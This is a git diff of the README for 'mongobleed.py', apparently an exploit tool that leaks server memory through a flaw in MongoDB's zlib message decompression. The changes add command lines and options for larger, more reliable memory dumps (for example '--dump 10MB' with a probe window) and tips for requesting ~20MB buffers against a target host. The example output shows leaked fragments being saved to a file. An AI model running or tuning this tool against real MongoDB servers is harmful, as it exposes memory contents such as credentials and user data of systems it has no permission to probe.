@@ -27,8 +27,14 @@ A flaw in MongoDB's zlib message decompression returns the allocated buffer size
 ## Usage
 
 ```bash
-# Basic scan (offsets 20-8192)
+# Basic scan (offsets 20-1MB)
 python3 mongobleed.py --host <target>
+
+# Exact-size dump (single probe)
+python3 mongobleed.py --host <target> --dump 10MB
+
+# Dump with a small window around the target (more reliable)
+python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048
 
 # Loop until stopped (Ctrl+C)
 python3 mongobleed.py --host <target> --loop
@@ -50,14 +56,16 @@ python3 mongobleed.py --host <target> --decode
 | `--host` | localhost | Target MongoDB host |
 | `--port` | 27017 | Target MongoDB port |
 | `--min-offset` | 20 | Minimum document length to probe |
-| `--max-offset` | 8192 | Maximum document length to probe |
-| `--buffer-bump` | 500 | Extra bytes for claimed uncompressed size |
+| `--max-offset` | 1048576 | Maximum document length to probe |
+| `--buffer-extra` | 500 | Extra bytes for claimed uncompressed size |
 | `--timeout` | 2.0 | Socket timeout in seconds |
 | `--workers` | `max(4, cpu*10)` | Thread count |
 | `--preview-bytes` | 80 | Bytes to show in console preview |
 | `--max-empty-passes` | 1 | Stop after N passes with no new leaks |
 | `--loop` | false | Keep looping until stopped |
 | `--decode` | false | Decode URL/unicode/base64 previews |
+| `--dump` | none | Single-probe claimed size like `10MB` or `512KB` |
+| `--dump-window` | 0 | Probe +/- N bytes around dump size |
 | `--output` | auto | Output file for leaked data |
 
 ## Example Output
@@ -77,6 +85,14 @@ python3 mongobleed.py --host <target> --decode
 [*] Unique fragments: 42
 [*] Saved to: leaked_localhost_27017_20250101_120000.bin
 ```
+
+## Notes
+
+- To request ~20MB buffers, target that size with `--max-offset 20971520` (and `--buffer-extra 0`).
+- To keep a smaller scan range but request larger buffers, use `--buffer-extra` so `doc_len + buffer_extra` equals your target size.
+- Use `--dump` for a single probe at an exact claimed size (e.g., `--dump 10MB`).
+- If a single probe yields no leaks, try `--dump-window 2048` (or larger) to scan around the target.
+- The effective cap is the server’s `maxMessageSizeBytes`; values above it will be rejected before parsing.
 
 ## Improvements
 
